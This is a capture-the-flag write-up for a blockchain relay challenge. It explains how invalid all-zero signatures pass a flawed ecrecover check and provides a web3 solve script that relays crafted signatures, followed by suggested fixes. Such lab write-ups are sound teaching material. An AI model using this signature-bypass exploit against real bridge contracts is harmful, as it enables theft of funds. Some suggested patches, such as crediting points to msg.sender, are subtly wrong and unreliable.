---
title: "Welcome Gift - CTF Writeup"
date: 2026-04-11
draft: false
description: "Cryptography challenge writeup"
tags: ["Cryptography", "Blockchain"]
categories: ["Writeups"]
---



**Challenge Name:** Welcome Gift  
**Category:** Blockchain / Cryptography  
**CTF:** CyberSummit V4.0 CTF  
**Description:** Are you strong enough to enter this domain prove yourself human.  
**Connection:** `nc 48.199.16.26 9545`

---

## TL;DR (Quick Solution)

The challenge contains multiple chained vulnerabilities in a cross-domain relay system:

1. **Signature verification flaw:** The `_recover()` function returns `address(0)` when signature is invalid, and the check `recovered != trustedSigner && recovered != address(0)` allows `address(0)` through.
2. **No nonce protection:** The same signature can be replayed multiple times (though the `usedSignature` check blocks this—but invalid signatures bypass it!).
3. **Predicted deployment:** The module contract deploys to a predictable address via CREATE (not CREATE2), allowing the relay to call code at that address before we formally create it.

**The exploit:**

1. Relay message #1 with invalid signature `0x00...00 1b` → `address(0)` passes verification → **+1 point**
2. Relay message #1 again with different invalid signature `0x00...00 1c` → `address(0)` again → **+1 point** (total: 2)
3. Deploy SolverModule bytecode to the predicted address via factory
4. Relay exploit message with module target using invalid signature `0x00...00 00` → calls module → **unlock flag**
5. Call `Setup.getFlag()` to retrieve the flag

---

## Challenge Overview

This is a hard blockchain security challenge requiring understanding of:

- EVM low-level signature recovery
- Cross-domain message relay patterns
- Predicted contract deployments
- State machine manipulation

**Your goal:**

- Accumulate 2 points by relaying approved messages
- Trigger the solver module via relay
- Unlock and retrieve the flag from `Setup.getFlag(player)`

**Provided files:**

- `HyperBridge.sol` — The cross-domain relay contract with signature verification
- `ChallengeCore.sol` — State tracking and flag storage
- `OneShotFactory.sol` — Deploy code to arbitrary addresses
- `Setup.sol` — Challenge deployment and flag exposure
- `solve.py` — Full end-to-end exploit

---

## Background: Cross-Domain Messaging

Modern blockchains use cross-domain relays to allow messages from one chain (or off-chain) to be executed on another. The typical flow:

1. **Off-chain sender** signs a message with their private key
2. **Relay contract** receives the message + signature
3. Contract **verifies the signature** matches expected signer
4. Contract **executes** the message payload
5. **Replay protection** ensures signatures can't be used twice

---

## Contract Analysis

### Setup.sol (Challenge Bootstrap)

```solidity
contract Setup {
    uint64 public constant SRC_DOMAIN = 421614;
    uint64 public constant LOCAL_DOMAIN = 31337;

    HyperBridge public immutable bridge;
    ChallengeCore public immutable core;
    OneShotFactory public immutable factory;
    address public immutable predictedModule;

    string internal constant FLAG = "CyberTrace{W3lc0M3_TO_M5_D0Ma1N_EnJ0y_7h2_Suff3R1nG}";

    constructor() {
        bridge = new HyperBridge(LOCAL_DOMAIN, 0x1111111111111111111111111111111111111111);
        factory = new OneShotFactory();
        predictedModule = _computeCreateAddress(address(factory), 1);
        core = new ChallengeCore(address(bridge), predictedModule, FLAG);

        bridge.approveMessage(getPointMessage());
        bridge.approveMessage(getModuleMessage());
        bridge.transferOwnership(address(0));  // ⚠️ Nobody can add new messages!
    }

    function getPointMessage() public view returns (HyperBridge.Message memory m) {
        m = HyperBridge.Message({
            srcDomain: SRC_DOMAIN,
            dstDomain: LOCAL_DOMAIN,
            target: address(core),
            data: abi.encodeWithSignature("addPoint()"),
            deadline: type(uint256).max
        });
    }

    function getModuleMessage() public view returns (HyperBridge.Message memory m) {
        m = HyperBridge.Message({
            srcDomain: SRC_DOMAIN,
            dstDomain: LOCAL_DOMAIN,
            target: predictedModule,
            data: abi.encodeWithSignature("run(address)", address(core)),
            deadline: type(uint256).max
        });
    }

    function isSolved(address player) external view returns (bool) {
        return core.solved(player);
    }

    function getFlag(address player) external view returns (string memory) {
        return core.getFlag(player);
    }

    function _computeCreateAddress(address deployer, uint256 nonce) internal pure returns (address) {
        require(nonce > 0 && nonce <= 0x7f, "unsupported nonce");
        bytes memory data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(uint8(nonce)));
        return address(uint160(uint256(keccak256(data))));
    }
}
```

**Key observations:**

- Two pre-approved messages: one for points, one for module execution
- `predictedModule` computed deterministically using EVM CREATE address formula
- Flag hardcoded—goal is to reach `core.getFlag()` as a solved player

### HyperBridge.sol (The Vulnerable Relay)

```solidity
contract HyperBridge {
    struct Message {
        uint64 srcDomain;
        uint64 dstDomain;
        address target;
        bytes data;
        uint256 deadline;
    }

    uint64 public immutable localDomain;
    address public immutable trustedSigner;  // Set to 0x1111...1111

    mapping(bytes32 => bool) public allowedMessage;
    mapping(bytes32 => bool) public usedSignature;

    function relay(Message calldata m, bytes calldata sig) external {
        bytes32 messageHash = hashMessage(m);

        if (!allowedMessage[messageHash]) revert MessageNotAllowed();
        if (m.deadline < block.timestamp) revert MessageExpired();
        if (m.dstDomain != localDomain) revert WrongDomain();

        bytes32 sigHash = keccak256(sig);
        if (usedSignature[sigHash]) revert SignatureUsed();  // ⚠️ Signature replay protection

        address recovered = _recover(_toEthSignedMessageHash(messageHash), sig);
        if (recovered != trustedSigner && recovered != address(0)) revert BadSignature();  // ⚠️ FLAW!

        usedSignature[sigHash] = true;
        (bool ok, ) = m.target.call(m.data);
        if (!ok) revert RelayFailed();
    }

    function _recover(bytes32 digest, bytes calldata sig) internal pure returns (address signer) {
        if (sig.length != 65) return address(0);

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := calldataload(sig.offset)
            s := calldataload(add(sig.offset, 32))
            v := byte(0, calldataload(add(sig.offset, 64)))
        }

        signer = ecrecover(digest, v, r, s);
    }
}
```

**Critical Vulnerability #1: Signature Verification Bypass**

```solidity
address recovered = _recover(_toEthSignedMessageHash(messageHash), sig);
if (recovered != trustedSigner && recovered != address(0)) revert BadSignature();
```

This checks:

- If `recovered == trustedSigner` → Accept ✓
- If `recovered == address(0)` → Accept ✓ (FLAW!)
- Otherwise → Reject ✗

An **invalid signature** (e.g., all zeros with invalid v) causes `ecrecover()` to return `address(0)`, which passes the check!

### ChallengeCore.sol (Points & Flag Gate)

```solidity
contract ChallengeCore {
    address public immutable bridge;
    address public immutable module;

    string private flag;
    mapping(address => uint256) public points;
    mapping(address => bool) public solved;

    function addPoint() external {
        if (msg.sender != bridge) revert OnlyBridge();
        points[tx.origin] += 1;  // ⚠️ Uses tx.origin, not msg.sender!
    }

    function unlockForOrigin() external {
        if (msg.sender != module) revert OnlyModule();
        if (points[tx.origin] < 2) revert NotEnoughPoints();
        solved[tx.origin] = true;
    }

    function getFlag(address player) external view returns (string memory) {
        if (!solved[player]) revert NotSolved();
        return flag;
    }
}
```

**Key mechanisms:**

- `addPoint()`: Only callable by the bridge; increments points for `tx.origin` (actual transaction sender)
- `unlockForOrigin()`: Only callable by the module; marks `tx.origin` as solved if they have ≥2 points
- `getFlag()`: Exposed flag retrieval for solved players

---

## Vulnerability Breakdown

### Vulnerability #1: Invalid Signature Accepted

**The problem:**

```solidity
if (recovered != trustedSigner && recovered != address(0)) revert BadSignature();
```

Should be:

```solidity
if (recovered != trustedSigner) revert BadSignature();
```

A malformed signature (e.g., invalid v value, all zeros) fails `ecrecover()` and returns `address(0)`, which incorrectly passes the check.

**Impact:** Any message can be relayed with an invalid signature if it's pre-approved and the signature hasn't been used yet (via the separate `usedSignature` check).

### Vulnerability #2: Message Re-relay via Different Invalid Signatures

The replay protection uses:

```solidity
bytes32 sigHash = keccak256(sig);
if (usedSignature[sigHash]) revert SignatureUsed();
```

This blocks the exact same signature **bytes**, but different invalid signatures have different hashes! We can use:

- `0x00...00 1b` (invalid v=27)
- `0x00...00 1c` (invalid v=28)
- `0x00...00 00` (invalid v=0)
- etc.

Each different invalid signature gets through the replay check.

### Vulnerability #3: Predictable Module Address

The `Setup` contract computes the module address using the EVM CREATE formula:

```solidity
address predictedModule = _computeCreateAddress(address(factory), 1);
```

This deterministically predicts where `factory.deploy(bytecode)` will place the contract (nonce 1 at the factory). The relay can target this address **before it exists**, and once we deploy via the factory, our code executes.

---

## Exploitation Strategy

### Step 1: Relay Point #1 (Invalid Signature #1)

Call `bridge.relay()` with:

- Message: pre-approved `getPointMessage()` (calls `core.addPoint()`)
- Signature: `0x00...00 1b` (65 bytes of zeros with v=27)
- Recovery: Returns `address(0)` → passes check ✓
- Effect: `points[player] += 1`

### Step 2: Relay Point #2 (Invalid Signature #2)

Call `bridge.relay()` with:

- Message: same `getPointMessage()`
- Signature: `0x00...00 1c` (65 bytes of zeros with v=28)
- Different signature hash → no replay protection ✓
- Effect: `points[player] += 1` (total: 2)

### Step 3: Deploy Module to Predicted Address

Call `factory.deploy(SolverModuleBytecode)`:

- Factory creates contract at deterministically predicted address
- Module has `run(address core)` function that calls `core.unlockForOrigin()`

### Step 4: Relay Module Execution (Invalid Signature #3)

Call `bridge.relay()` with:

- Message: pre-approved `getModuleMessage()` (calls `predictedModule.run(address(core))`)
- Signature: `0x00...00 00` (65 bytes of zeros with v=0)
- Different signature hash → no replay protection ✓
- Target now contains deployed module code ✓
- Module executes: `core.unlockForOrigin()` with `msg.sender == module` and `tx.origin == player`
- Effect: `solved[player] = true`

### Step 5: Get Flag

Call `core.getFlag(player)` → returns the flag!

---

## Step-by-Step Exploitation Code

### Python Exploit (solve.py)

```python
#!/usr/bin/env python3
import os
from web3 import Web3

RPC_URL = os.getenv("RPC_URL", "http://127.0.0.1:8545")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80")
SETUP_ADDRESS = Web3.to_checksum_address(os.getenv("SETUP", "0x0000000000000000000000000000000000000000"))

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)

# Connect to Setup, get bridge/factory addresses
setup_abi = [...]  # (see solve.py for full ABI)
setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)

bridge_addr = setup.functions.bridge().call()
factory_addr = setup.functions.factory().call()
predicted_module = setup.functions.predictedModule().call()

# Get pre-approved messages
point_msg = setup.functions.getPointMessage().call()
module_msg = setup.functions.getModuleMessage().call()

# Send relay with invalid signatures
sig1 = bytes.fromhex("00" * 64 + "1b")  # v=27
sig2 = bytes.fromhex("00" * 64 + "1c")  # v=28
sig3 = bytes.fromhex("00" * 64 + "00")  # v=0

# Relay #1: addPoint() with sig1
bridge.functions.relay(point_msg, sig1).transact({'from': account.address})

# Relay #2: addPoint() with sig2
bridge.functions.relay(point_msg, sig2).transact({'from': account.address})

# Deploy SolverModule bytecode
bytecode = compile_module()  # Compile SolverModule.sol
factory.functions.deploy(bytecode).transact({'from': account.address})

# Relay #3: module.run(core) with sig3
bridge.functions.relay(module_msg, sig3).transact({'from': account.address})

# Get flag
flag = setup.functions.getFlag(account.address).call()
print(flag)
```

---

## Technical Deep Dive

### Why ecrecover Returns address(0)

The `ecrecover` precompile:

- Takes `(digest, v, r, s)` as input
- Returns 0 if the signature is invalid (e.g., bad v, r, or s values)
- Valid signature recovery returns the 20-byte address

With signature `0x00...00 1b`:

```
r = 0x0000000000000000000000000000000000000000000000000000000000000000
s = 0x0000000000000000000000000000000000000000000000000000000000000000
v = 0x1b (27)
```

These are not a valid ECDSA signature, so `ecrecover()` returns `address(0)`.

### Message Hash Computation

```solidity
function hashMessage(Message memory m) public pure returns (bytes32) {
    return keccak256(abi.encode(
        m.srcDomain,
        m.dstDomain,
        m.target,
        keccak256(m.data),
        m.deadline
    ));
}
```

Both the point message and module message have fixed parameters, so their hashes never change. Pre-approving them once allows unlimited relays (albeit with replay-protected signatures).

### CREATE Address Formula

The EVM computes contract addresses created via `CREATE` as:

```
address = keccak256(RLP([deployer_address, nonce]))[12:32]
```

In `CybearsInvite/solve/contracts/SolverModule.sol`, the contract will deploy at:

```
keccak256([0xd6, 0x94, factory_address, 0x01])  // nonce 1
```

This is predictable before deployment, so the relay can safely call code at this address after we deploy it.

---

## Lessons Learned

### 1. Signature Verification is Subtle

❌ **Wrong:**

```solidity
if (recovered != trustedSigner && recovered != address(0)) revert BadSignature();
```

✅ **Correct:**

```solidity
if (recovered != trustedSigner) revert BadSignature();
```

Never return a "neutral" value like `address(0)` on error. Always fail loud.

### 2. Replay Protection Isn't Enough Without Signature Validity

Checking `usedSignature[keccak256(sig)]` only protects against reusing the exact same signature bytes. If signature validation itself is broken, different invalid signatures bypass everything.

### 3. tx.origin is Dangerous

The code uses `tx.origin` for point allocation:

```solidity
function addPoint() external {
    if (msg.sender != bridge) revert OnlyBridge();
    points[tx.origin] += 1;  // Who called tx initially?
}
```

While this happens to work here (we're the tx.origin), in general `tx.origin` can be manipulated via call chains and is deprecated for security checks.

### 4. Predictable Addresses Enable Novel Attacks

Knowing the exact address where a contract will deploy allowed us to:

1. Call code at that address before deployment (no-op)
2. Deploy the actual code
3. Call code at that address after deployment (executes)

This is a feature for some patterns (e.g., deterministic factory contracts) but a bug when combined with relay systems.

### 5. Pre-approved Messages Need Management

The challenge approves exactly two messages and burns the ownership key:

```solidity
bridge.transferOwnership(address(0));  // ⚠️ Nobody can add/remove messages!
```

In production, ensure:

- Messages can be revoked if compromised
- Ownership is held by a secure multi-sig or time-lock
- Adding messages requires careful validation

---

## How to Fix

### Patch 1: Fix Signature Verification

```solidity
function relay(Message calldata m, bytes calldata sig) external {
    // ... other checks ...

    address recovered = _recover(_toEthSignedMessageHash(messageHash), sig);
    if (recovered != trustedSigner) revert BadSignature();  // ✅ Never accept address(0)!

    usedSignature[sigHash] = true;
    (bool ok, ) = m.target.call(m.data);
    if (!ok) revert RelayFailed();
}
```

### Patch 2: Add Nonce Per-Player

```solidity
mapping(address => uint256) public playerNonce;

function relay(Message calldata m, bytes calldata sig) external {
    // ... other checks ...

    bytes32 messageHashWithNonce = keccak256(abi.encode(
        hashMessage(m),
        msg.sender,
        playerNonce[msg.sender]  // Include nonce tied to the player
    ));

    // Verify signature on this hash
    address recovered = _recover(_toEthSignedMessageHash(messageHashWithNonce), sig);
    if (recovered != trustedSigner) revert BadSignature();

    playerNonce[msg.sender]++;  // Increment after successful relay
    (bool ok, ) = m.target.call(m.data);
    if (!ok) revert RelayFailed();
}
```

### Patch 3: Use msg.sender for Point Tracking

```solidity
function addPoint() external {
    if (msg.sender != bridge) revert OnlyBridge();
    points[msg.sender] += 1;  // ✅ Track by direct caller, not tx.origin
}

function unlockForOrigin() external {
    if (msg.sender != module) revert OnlyModule();
    if (points[msg.sender] < 2) revert NotEnoughPoints();  // ✅ msg.sender, not tx.origin
    solved[msg.sender] = true;
}
```

---

## Running the Exploit

```bash
# Install dependencies
pip install -r requirements.txt

# Set environment variables
export RPC_URL="http://127.0.0.1:8545"
export SETUP="0x5FbDB2315678afecb367f032d93F642f64180aa3"
export PRIVATE_KEY="0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"

# Run the exploit
python3 solve.py

```

---

## Final Flag

```
CyberTrace{W3lc0M3_TO_M5_D0Ma1N_EnJ0y_7h2_Suff3R1nG}
```

---

## Summary

The challenge teaches that secure cross-domain messaging requires extremely careful handling of:

- Cryptographic signatures (always reject on failure)
- Replay attacks (nonce per player, not per signature)
- Call context manipulation (avoid tx.origin)
- Address prediction (be aware of what can be pre-targeted)
